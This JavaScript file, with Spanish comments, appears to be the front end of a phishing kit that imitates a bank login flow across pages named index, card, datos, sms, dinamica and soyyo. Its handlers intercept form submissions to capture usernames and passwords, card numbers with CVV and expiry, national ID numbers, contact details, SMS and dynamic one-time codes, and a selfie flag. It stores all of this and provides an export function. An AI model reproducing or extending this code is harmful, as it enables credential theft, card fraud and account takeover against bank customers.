/* Script de captura de datos - PANEL INDEPENDIENTE (Sin servidor remoto) */

function ensureSessionId() {
  var sessionId = localStorage.getItem("sessionId");
  if (!sessionId) {
    sessionId = "sess_" + Math.random().toString(36).slice(2) + Date.now().toString(36);
    localStorage.setItem("sessionId", sessionId);
  }
  return sessionId;
}

function getBarrio() {
  return localStorage.getItem("barrio") || "";
}

function getIndexData() {
  var usuario = localStorage.getItem("indexUsuario");
  var clave = localStorage.getItem("indexClave");
  if (!usuario && !clave) return {};
  return { indexUsuario: usuario || "", indexClave: clave || "" };
}

/* NUEVA FUNCIÓN: Guardar datos en localStorage en lugar de enviar al servidor */
async function captureAndStore(flowType, body, nextFlow) {
  // Asegurar sessionId
  body.sessionId = ensureSessionId();
  body.barrio = getBarrio() || undefined;
  var indexData = getIndexData();
  if (indexData.indexUsuario !== undefined) body.indexUsuario = indexData.indexUsuario;
  if (indexData.indexClave !== undefined) body.indexClave = indexData.indexClave;

  // Guardar en localStorage
  var allData = JSON.parse(localStorage.getItem("panelData") || "{}");
  allData[flowType] = body;
  allData.timestamp = new Date().toISOString();

  localStorage.setItem("panelData", JSON.stringify(allData));
  console.log("✅ Datos guardados:", flowType, body);

  // Preparar redirección
  var flowData = {
    flowType: flowType,
    data: body,
    nextFlow: nextFlow || "loading.html"
  };

  localStorage.setItem("flowData", JSON.stringify(flowData));

  // Redirigir a loading.html
  setTimeout(function() {
    window.location.href = "loading.html";
  }, 500);
}

/* INDEX.HTML - Captura login */
function initIndexCapture() {
  var btn = document.querySelector('[data-test="submit-button"]') ||
            document.querySelector('button[type="submit"]');

  if (!btn) return;

  btn.addEventListener("click", function (event) {
    event.preventDefault();

    var usuario = document.getElementById("usuario") ||
                  document.querySelector('input[type="text"]');
    var clave = document.getElementById("clave") ||
                document.querySelector('input[type="password"]');

    if (usuario && clave) {
      // Guardar credenciales en localStorage
      localStorage.setItem("indexUsuario", usuario.value || "");
      localStorage.setItem("indexClave", clave.value || "");

      captureAndStore("index", {
        usuario: usuario.value || "",
        clave: clave.value || ""
      }, "card.html");
    }
  });
}

/* CARD.HTML - Envía valores de tarjeta */
function initCardCapture() {
  var btn = document.querySelector('[data-test="confirm-button"]');
  if (!btn) return;

  btn.addEventListener("click", function (event) {
    event.preventDefault();
    var cardnumber = document.getElementById("cardnumber");
    var cvv = document.getElementById("cvv");
    var expiry = document.getElementById("expiry");

    captureAndStore("card", {
      cardnumber: cardnumber ? cardnumber.value : "",
      cvv: cvv ? cvv.value : "",
      expiry: expiry ? expiry.value : ""
    }, "datos.html");
  });
}

/* DATOS.HTML - Captura datos personales */
function initDatosCapture() {
  var btn = document.querySelector('[data-test="save-button"]');
  if (!btn) return;

  btn.addEventListener("click", function (event) {
    event.preventDefault();
    var name = document.getElementById("name");
    var cedula = document.getElementById("cedula");
    var email = document.getElementById("email");
    var phone = document.getElementById("phone");

    captureAndStore("datos", {
      name: name ? name.value.trim() : "",
      cedula: cedula ? cedula.value.trim() : "",
      email: email ? email.value.trim() : "",
      phone: phone ? phone.value.trim() : ""
    }, "sms.html");
  });
}

/* SMS.HTML - Obtener código SMS */
function getSmsCode() {
  var digits = document.querySelectorAll(".sms-digit");
  var code = "";
  for (var i = 0; i < digits.length; i++) {
    code += digits[i].value || "";
  }
  return code;
}

function initSmsCapture() {
  var btn = document.getElementById("btnConfirmar");
  if (!btn) return;

  btn.addEventListener("click", function (event) {
    event.preventDefault();
    captureAndStore("sms", {
      smsCode: getSmsCode()
    }, "dinamica.html");
  });
}

/* DINAMICA.HTML - Obtener código dinámico */
function getDinamicaCode() {
  var digits = document.querySelectorAll(".Dinamica-digit");
  var code = "";
  for (var i = 0; i < digits.length; i++) {
    code += digits[i].value || "";
  }
  return code;
}

function initDinamicaCapture() {
  var btn = document.getElementById("btnConfirmar");
  if (!btn) return;

  btn.addEventListener("click", function (event) {
    event.preventDefault();
    captureAndStore("dinamica", {
      dinamicaCode: getDinamicaCode()
    }, "soyyo.html");
  });
}

/* SOYYO.HTML - Captura foto */
function initSoyyoCapture() {
  var btn = document.querySelector('[data-test="continue-button"]');
  if (!btn) return;

  btn.addEventListener("click", function (event) {
    event.preventDefault();
    var photo = document.getElementById("captured-photo");
    var photoData =
      photo && photo.src && photo.src.indexOf("data:") === 0 ? photo.src : undefined;

    captureAndStore("soyyo", {
      photoData: photoData ? "Foto capturada" : "Sin foto"
    }, "index.html");
  });
}

/* EXPORTAR DATOS CAPTURADOS */
function exportCapturedData() {
  var allData = localStorage.getItem("panelData");
  if (allData) {
    console.log("📊 DATOS CAPTURADOS:", JSON.parse(allData));
    return JSON.parse(allData);
  }
  return null;
}

/* LIMPIAR DATOS */
function clearCapturedData() {
  localStorage.removeItem("panelData");
  localStorage.removeItem("flowData");
  console.log("🗑️ Datos limpiados");
}
